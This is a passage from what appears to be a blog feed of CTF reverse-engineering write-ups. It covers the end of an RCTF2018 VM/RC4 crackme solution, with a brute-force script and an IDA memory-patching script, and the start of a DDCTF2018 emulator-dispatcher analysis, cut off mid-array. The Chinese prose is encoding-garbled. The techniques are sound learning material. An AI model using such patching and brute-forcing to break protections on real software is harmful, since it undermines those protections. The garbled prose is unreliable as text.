r5, r3    mov r5, byte ptr r5    cmp r5, r6    jmp s2:    exits2:    add r3, r5    mov r5, r3    cmp r5, r4    jmp s1    exit"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŒ‡ä»¤åºåˆ—å¯¹åº”pythonä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rc4_input <span class="token operator">=</span> <span class="token string">"abcdefg"</span>r0 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span>    <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> r6<span class="token punctuation">:</span> <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥çˆ†ç ´rc4_inputï¼š</p><ul><li>å¾—åˆ°238cbefd25d765f4b6b3b6fe174a2effc384ed21a4ab11096a5</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r0 <span class="token operator">=</span> <span class="token number">0x66</span>r1 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span>   <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span>   <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>rc4_input <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">input</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0        <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">:</span>            rc4_input<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token keyword">for</span> i <span class="token keyword">in</span> rc4_input<span class="token punctuation">:</span>    <span class="token builtin">input</span> <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç›´æ¥rc4è§£å¯†å°±è¡Œï¼šå¯†é’¥å°±æ˜¯å‰é¢çš„dword_4099D0[0]ï¼Œè¿™é‡Œé‡‡ç”¨å¤§ä½¬çš„æ–¹æ³•ç›´æ¥ä¿®æ”¹å†…å­˜æ•°æ®å–è§£å¯†ï¼Œå› ä¸ºä¸çŸ¥é“dword_4099D0[0]æœ‰æ²¡æœ‰åœ¨å…¶ä»–åœ°æ–¹æ”¹æ”¹ï¼Œæ‰€ä»¥è¿™æ ·å…¶å®æ›´åŠ ä¿é™©</p><p>è„šæœ¬å¦‚ä¸‹:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>rc4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> addr <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> data_addr <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#æˆ‘è¿™é‡Œdata_addr = 0x60FD54</span>    idc<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> rc4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2023/04/07/rctf2018-magic/14.png"></p><p><img src="/2023/04/07/rctf2018-magic/15.png"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1170775">https://cloud.tencent.com/developer/article/1170775</a></p><p><a href="https://www.52pojie.cn/thread-742361-1-1.html">https://www.52pojie.cn/thread-742361-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMé€†å‘ </tag>
            
            <tag> setjmp/longjmp </tag>
            
            <tag> rc4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2018-é»‘ç›’ç ´è§£</title>
      <link href="/2023/04/05/ddctf2018-hei-he-po-jie/"/>
      <url>/2023/04/05/ddctf2018-hei-he-po-jie/</url>
      
        <content type="html"><![CDATA[<p>ç›®æ ‡ï¼šè¾“å‡º<code>Binggo</code>å­—ç¬¦ä¸²ï¼›</p><p>é¢˜å‹ï¼šåªç»™å¯æ‰§è¡Œç¨‹åºï¼Œé€†å‘emulatorï¼Œæ„é€ opcodeï¼Œè¯»å–flag</p><p>mainå‡½æ•°åŸºæœ¬é€»è¾‘ï¼š</p><ul><li>è¾“å…¥é•¿åº¦å¤§äº10çš„passwordï¼Œè¾“å…¥å‰10ä¸ªå­—ç¬¦åªèƒ½æ˜¯å­—æ¯æˆ–è€…æ•°å­—</li><li>passwordç»„æˆä¸€ä¸ªæ–‡ä»¶åï¼Œæ‰€ä»¥æ˜“çŸ¥password=<code>48ee204317</code></li><li>æ¥ä¸‹æ¥è¾“å…¥Passcodeï¼Œå…¶å­˜å‚¨åœ¨(v4+16)åœ°å€å¤„ï¼Œé•¿åº¦å°äº100</li><li>ç„¶åè¿›å…¥ä¸€ä¸ªDispatcherå‡½æ•°ä¸­è¿›è¡ŒPasscodeè§£æå¹¶æ‰§è¡Œç›¸å…³å‡½æ•°</li><li>å¦‚æœbyte_603F00=1ï¼Œåˆ™è¾“å‡ºSuccessï¼ˆä½†è¿™é‡Œä¸æ˜¯é‡ç‚¹ï¼Œå› ä¸ºé¢˜ç›®è¦æ±‚æ˜¯è¾“å‡º<code>Binggo</code>å­—ç¬¦ä¸²å³å¯</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/1.png" alt="1"></p><p>å¯¹byte_603F00äº¤å‰å¼•ç”¨è·Ÿè¸ªåˆ°sub_40113Då‡½æ•°</p><ul><li>å¯ä»¥çœ‹å‡ºï¼Œç»è¿‡ä¸‰ä¸ªå‡½æ•°çš„checkï¼Œæœ€ç»ˆbyte_603F00æ‰èƒ½ä¸º1</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/2.png"></p><p>å¯¹sub_40113Då‡½æ•°äº¤å‰å¼•ç”¨è·Ÿè¸ªå¤±è´¥ï¼Œä½†æ˜¯åœ¨æ•°æ®æ®µå‘ç°å­˜å‚¨äº†å¾ˆå¤šå‡½æ•°çš„offsetï¼Œå¯ä»¥çŒœæµ‹æ˜¯VMé€†å‘ï¼ŒDispatcheråˆ™æ˜¯åˆ†å‘è¯¥å¤„çš„å‡½æ•°</p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/3.png"></p><p>æŸ¥çœ‹mainä¸­byte_603F00ä¸Šé¢çš„Dispatcherå‡½æ•°(ç»è¿‡åˆ†æå¾—åˆ°çš„)</p><ul><li>ç›¸å…³æ“ä½œçœ‹æ³¨é‡Š(å…¶å®æœ€åä¸€ä¸ªifé‡Œé¢çš„é€»è¾‘å¯ä»¥åˆ¤æ–­æ˜¯Dispatcheräº†</li><li>ç¬¬ä¸€ä¸ªforå¾ªç¯å¤„ç†æ¯ä¸ªPasscodeå­—ç¬¦ï¼Œç¬¬äºŒä¸ªforå¾ªç¯æŸ¥æ‰¾Passcodeå­—ç¬¦å¯¹åº”çš„æ“ä½œ</li><li>æˆ‘ä»¬è¾“å…¥çš„Passcodeä¼šå½“åšbyte_603900æ•°ç»„çš„ä¸‹æ ‡ï¼Œå¦‚æœå…¶è¯¥ä¸‹æ ‡å¤„byte_603900å…ƒç´ çš„å€¼ä¸º9ä¸ªopcodeä¸­çš„ä¸€ä¸ªå°±ä¼šæ‰§è¡Œç›¸å…³æ“ä½œ</li><li>ä¹Ÿå¯ä»¥çœ‹æ±‡ç¼–ä»£ç é€»è¾‘å›¾ï¼Œä¸Šé¢çš„jnzåˆ™æ˜¯ç¬¬äºŒä¸ªforå¾ªç¯é‡Œé¢çš„ifåˆ¤æ–­é€»è¾‘ï¼Œæœ€ä¸‹é¢çš„call eaxåˆ™æ˜¯å»è°ƒç”¨å¯¹åº”çš„å‡½æ•°</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/4.png"></p><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/5.png" alt="Dispatcheré€»è¾‘å›¾"></p><p>åœ¨ç¬¬äºŒä¸ªforä¸‹æ–­ï¼ŒåŠ¨æ€è°ƒè¯•ï¼Œå¾—å‡ºopcodeï¼Œä»¥åŠå¯¹åº”çš„v2ä¸‹æ ‡</p><ul><li>å¯¹ä¸Šé¢çš„æ±‡ç¼–é€»è¾‘å›¾ç®€å•åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å¾—å‡ºc1ä¸ºæˆ‘ä»¬è¾“å…¥v2ä¸‹æ ‡ï¼Œalä¸ºopcode</li></ul><p>å°†byte_603F00å¯¼å‡ºå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byte_603F00 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>   <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span>   <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span>   <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span>   <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span>   <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span>   <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>   <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>   <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span>   <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span>   <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>   <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span>   <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span>   <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span>   <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span>   <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span>   <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>   <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>   <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span>   <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token 